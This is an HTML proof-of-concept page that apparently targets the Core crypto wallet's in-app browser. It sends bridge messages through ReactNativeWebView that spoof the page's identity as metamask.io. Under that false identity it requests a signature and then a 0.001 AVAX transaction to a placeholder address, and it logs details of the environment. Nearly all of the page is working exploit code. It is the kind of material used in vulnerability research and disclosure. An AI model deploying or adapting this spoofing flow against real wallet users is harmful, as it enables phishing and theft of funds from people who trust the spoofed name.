<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Core Spoof PoC</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: system-ui, sans-serif; margin: 16px; background:#fafafa; }
    button { display:block; width:100%; padding: 18px; font-size:17px; font-weight:600;
             border:1px solid #333; border-radius:6px; background:#fff; margin: 10px 0; }
    button:active { background:#eee; }
    pre { background:#111; color:#0f0; padding:10px; white-space:pre-wrap;
          font-size:11px; border-radius:6px; max-height:380px; overflow:auto; }
  </style>
</head>
<body>
  <button id="btnGo">RUN</button>
  <pre id="log"></pre>

  <script>
    // ── hard-coded payload ──────────────────────────────────────
    const SIGN_MSG = 'Sign in to core.app — nonce: 0xDEADBEEF';
    const TX_TO    = '0xdEadBeefdeadBEEFDEadbEefdEadbeefdeAdBeef';
    const TX_VALUE = '0x38d7ea4c68000';      // 0.001 AVAX

    // ── helpers ─────────────────────────────────────────────────
    const logEl = document.getElementById('log');
    const log = (m) => {
      logEl.textContent += '[' + new Date().toISOString().slice(11,19) + '] ' + m + "\n";
      logEl.scrollTop = logEl.scrollHeight;
      console.log(m);
    };
    const send = (obj) => {
      const rn = window.ReactNativeWebView;
      if (!rn || !rn.postMessage) { log('ERR: not in Core in-app browser'); return false; }
      rn.postMessage(JSON.stringify(obj));
      log('SENT -> ' + JSON.stringify(obj).slice(0, 200));
      return true;
    };
    const spoofIdentity = () => send({
      method:'domain_metadata',
      payload: JSON.stringify({
        domain:'', name:'metamask.io',
        icon:'https://metamask.io/favicons/default/favicon.ico', url:''
      })
    });
    const rnReq = (req) => send({
      method:'provider_request',
      payload: JSON.stringify({ id: Math.floor(Math.random()*1e9), request: req })
    });
    const userAddr = () =>
      (window.ethereum && window.ethereum.selectedAddress) ||
      '0x0000000000000000000000000000000000000000';
    const utf8ToHex = (s) => '0x' + Array.from(new TextEncoder().encode(s))
      .map(b => b.toString(16).padStart(2,'0')).join('');

    // ── one-shot flow ───────────────────────────────────────────
    document.getElementById('btnGo').onclick = () => {
      spoofIdentity();
      setTimeout(() => rnReq({
        method:'personal_sign',
        params:[ utf8ToHex(SIGN_MSG), userAddr() ]
      }), 200);
      setTimeout(() => {
        spoofIdentity();
        rnReq({
          method:'eth_sendTransaction',
          params:[{ from: userAddr(), to: TX_TO, value: TX_VALUE, data:'0x', gas:'0x5208' }]
        });
      }, 4000);
    };

    // ── env probe ───────────────────────────────────────────────
    log('UA: ' + navigator.userAgent.slice(0,70));
    log('ReactNativeWebView: ' + !!window.ReactNativeWebView);
    if (window.ethereum) {
      log('addr=' + window.ethereum.selectedAddress + ' chainId=' + window.ethereum.chainId);
    } else {
      log('window.ethereum: not injected');
    }
  </script>
</body>
</html>
